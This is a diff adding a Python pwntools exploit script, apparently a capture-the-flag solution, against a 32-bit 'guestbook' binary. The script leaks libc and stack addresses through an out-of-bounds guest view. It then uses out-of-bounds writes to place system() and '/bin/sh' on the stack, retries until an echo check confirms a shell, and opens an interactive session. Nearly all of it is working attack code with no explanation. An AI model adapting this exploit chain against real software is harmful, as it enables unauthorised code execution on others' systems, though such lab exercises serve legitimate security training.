@@ -1,0 +1,65 @@
+from pwn import *
+
+#p = process("./guestbook_patched")
+
+libc = ELF("./libc.so.6")
+
+while(True):
+    try:
+        p = process("./guestbook_patched")
+        '''
+        p = gdb.debug("./guestbook_patched", gdbscript = 
+        b *main
+        b *main + 466
+        b *main + 515
+        )
+        '''
+        for i in range(4):
+            p.sendline(b"AAAAAAAA")
+
+        p.recvuntil(b"3. Quit\n")
+        p.sendlineafter(b">>", b"1")
+        p.sendlineafter(b"view?\n>>>", b"6")
+        s = p.recv(28)
+        libc_base = u32(s[20:24]) - 241056
+        stack_leak = u32(s[24:28])
+        print(hex(libc_base))
+        system = libc_base + libc.symbols['system']
+        binsh = libc_base + list(libc.search(b"/bin/sh"))[0]
+
+        p.recvuntil(b"3. Quit\n")
+        p.sendlineafter(b">>", b"2")
+        p.sendlineafter(b"change?\n>>>", b"6")
+        p.sendlineafter(b"guest.\n>>>", p32(stack_leak + 48))
+        p.send(b"\n")
+        p.recvuntil(b"3. Quit\n")
+        p.sendlineafter(b">>", b"2")
+        p.sendlineafter(b"change?\n>>>", b"0")
+        p.sendlineafter(b"guest.\n>>>", p32(system))
+        p.send(b"\n")
+
+        p.recvuntil(b"3. Quit\n")
+        p.sendlineafter(b">>", b"2")
+        p.sendlineafter(b"change?\n>>>", b"6")
+        p.sendlineafter(b"guest.\n>>>", p32(stack_leak + 56))
+        p.send(b"\n")
+        p.recvuntil(b"3. Quit\n")
+        p.sendlineafter(b">>", b"2")
+        p.sendlineafter(b"change?\n>>>", b"0")
+        p.sendlineafter(b"guest.\n>>>", p32(binsh))
+        p.send(b"\n")
+
+        p.recvuntil(b"3. Quit\n")
+        p.sendlineafter(b">>", b"3")
+        
+        p.sendline(b"echo vani5hing")
+        p.recvuntil(b"vani5hing")
+        break
+    except:
+        try:
+            p.close()
+        except:
+            pass
+
+p.interactive()
+        
